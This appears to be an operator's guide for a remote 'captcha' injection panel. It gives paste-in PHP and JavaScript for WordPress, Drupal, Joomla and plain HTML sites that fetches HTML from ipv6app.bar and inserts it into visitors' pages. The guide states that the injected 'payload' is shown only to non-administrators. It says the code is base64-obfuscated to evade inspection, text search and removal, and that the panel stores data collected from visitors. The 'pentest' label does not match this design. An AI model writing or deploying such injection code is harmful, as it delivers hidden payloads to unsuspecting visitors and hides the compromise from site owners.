# API Integration Guide

## 🌐 Public API Endpoint

**Base URL:** `https://ipv6app.bar/public_api.php`

### Supported Engines

| Engine | Description | Usage |
|--------|-------------|-------|
| `wordpress` | WordPress CMS | For WP themes/plugins |
| `drupal` | Drupal CMS | For Drupal themes/modules |
| `joomla` | Joomla CMS | For Joomla templates/plugins |
| `html` | Plain HTML/JavaScript | For any website |

## 📡 API Usage

### WordPress Integration

**Endpoint:**
```
https://ipv6app.bar/public_api.php?engine=wordpress
```

**Installation:**
1. Copy the generated PHP code
2. Open `wp-content/themes/your-theme/functions.php`
3. Paste the code at the end of the file
4. Save and refresh your site

**What it does:**
- Checks if user is NOT an administrator
- Injects captcha/payload code for non-admin users only
- Administrators can browse freely

### Drupal Integration

**Endpoint:**
```
https://ipv6app.bar/public_api.php?engine=drupal
```

**Installation:**
1. Add code to your theme or custom module
2. Clear Drupal cache: `drush cr`

**Supported Versions:**
- Drupal 8.x
- Drupal 9.x
- Drupal 10.x

### Joomla Integration

**Endpoint:**
```
https://ipv6app.bar/public_api.php?engine=joomla
```

**Installation:**
1. Add code to your template's `index.php`
2. Or create a custom plugin

**Supported Versions:**
- Joomla 3.x (uncomment the line in generated code)
- Joomla 4.x (default)

### HTML/JavaScript Integration

**Endpoint:**
```
https://ipv6app.bar/public_api.php?engine=html
```

**Installation:**
1. Copy the generated `<script>` tag
2. Paste before the `</body>` tag in your HTML
3. Works on any static or dynamic website

## 🔧 How It Works

### JavaScript Mechanism

```javascript
// 1. Check if cookie exists
const cookie = getCookie("cookie-captcha-complete");

// 2. If no cookie, fetch captcha from panel
if(!cookie) {
    fetch("https://ipv6app.bar")
    .then(response => response.text())
    .then(html => {
        if(html.length === 0) {
            // No captcha needed, set cookie
            document.cookie = "cookie-captcha-complete=1; ...";
        } else {
            // Inject captcha HTML
            document.body.insertAdjacentHTML("beforeend", html);
        }
    });
}
```

### Cookie Management

**Cookie Name:** `cookie-captcha-complete`

**Max Age:** 365 days (1 year)

**Path:** `/` (entire domain)

**When Set:**
- After successful captcha completion
- When panel returns empty response (visitor allowed)

### Message Passing

The iframe can communicate with parent page:

```javascript
window.addEventListener("message", e => {
    if(e.data === "reload") {
        window.location.reload(); // Reload page after captcha
    }
});
```

## 🎯 Use Cases

### 1. WordPress Blog Protection

```php
// functions.php
$current_user = wp_get_current_user();
if(!in_array("administrator", $current_user->roles)) {
    // Captcha loads for non-admin visitors
    echo(base64_decode('...'));
}
```

### 2. E-commerce Site (WooCommerce)

Same code works! Admins can manage store, visitors see captcha.

### 3. Custom HTML Landing Page

```html
<!DOCTYPE html>
<html>
<body>
    <h1>My Landing Page</h1>
    
    <!-- Captcha integration -->
    <script>
        // Generated code from API
    </script>
</body>
</html>
```

## 🔒 Security Features

### Base64 Encoding

JavaScript code is base64-encoded in PHP to avoid:
- Direct code inspection
- Simple text search
- Automated removal

### Admin Bypass

Administrators always bypass captcha:
- WordPress: Users with `administrator` role
- Drupal: Users with `administrator` role
- Joomla: Users with `core.admin` permission

### Cookie-based Tracking

Once visitor completes captcha:
- Cookie set for 365 days
- No need to re-verify
- Panel tracks via database

## 📊 Panel Configuration

The API automatically uses panel settings:

| Setting | Variable | Purpose |
|---------|----------|---------|
| Cookie Name | `{{cookiename}}` | Custom cookie name |
| Base URL | `{{baseurl}}` | Panel domain |
| Template Type | Config | Captcha/modal style |
| Theme | Config | Color scheme |

## 🚀 Quick Start

### Step 1: Choose Your Platform

```bash
# WordPress
curl "https://ipv6app.bar/public_api.php?engine=wordpress"

# HTML
curl "https://ipv6app.bar/public_api.php?engine=html"
```

### Step 2: Copy Generated Code

The API returns ready-to-use code with instructions.

### Step 3: Integrate

Follow the installation instructions for your platform.

### Step 4: Test

1. Visit your site as regular user
2. Captcha should load
3. Complete captcha
4. Cookie set, no more captchas

## 🔄 API Response Format

### WordPress/Drupal/Joomla

```php
/**
 * Pentest Panel Integration for WORDPRESS
 * 
 * Installation Instructions:
 * ...
 */

<?php
// Generated integration code
```

### HTML

```html
<!-- Pentest Panel Integration -->
<!-- Add this code before </body> tag -->

<script type='text/javascript'>
// Generated JavaScript code
</script>
```

## ⚠️ Important Notes

1. **Admin Access:** Admins NEVER see captcha
2. **Cookie Persistence:** Lasts 365 days
3. **Panel Must Be Online:** If panel is down, no captcha loads
4. **HTTPS Required:** Mixed content warnings on HTTP sites
5. **JavaScript Required:** Site needs JS enabled

## 🐛 Troubleshooting

### Captcha Not Loading

1. Check browser console for errors
2. Verify panel URL is accessible
3. Check JavaScript is enabled
4. Clear cookies and try again

### Cookie Not Setting

1. Check domain matches
2. Verify path is `/`
3. Look for JavaScript errors
4. Check browser privacy settings

### Admin Still Sees Captcha

1. Verify user role is `administrator`
2. Check WP user roles
3. Clear WordPress cache
4. Test with different admin account

## 📈 Statistics Tracking

Panel tracks all visitors in database:

**Tables:**
- `visits` - Successful captcha completions
- `redirects` - Rejected visitors
- `received` - Data collected from visitors

**Metrics:**
- IP address
- User agent
- Country code
- Browser/OS info
- Language
- Referrer

## 🔗 Quick Links

**WordPress:**
```
https://ipv6app.bar/public_api.php?engine=wordpress
```

**Drupal:**
```
https://ipv6app.bar/public_api.php?engine=drupal
```

**Joomla:**
```
https://ipv6app.bar/public_api.php?engine=joomla
```

**HTML:**
```
https://ipv6app.bar/public_api.php?engine=html
```

---

**Created:** February 11, 2026  
**Panel URL:** https://ipv6app.bar  
**Admin:** https://ipv6app.bar/login.php
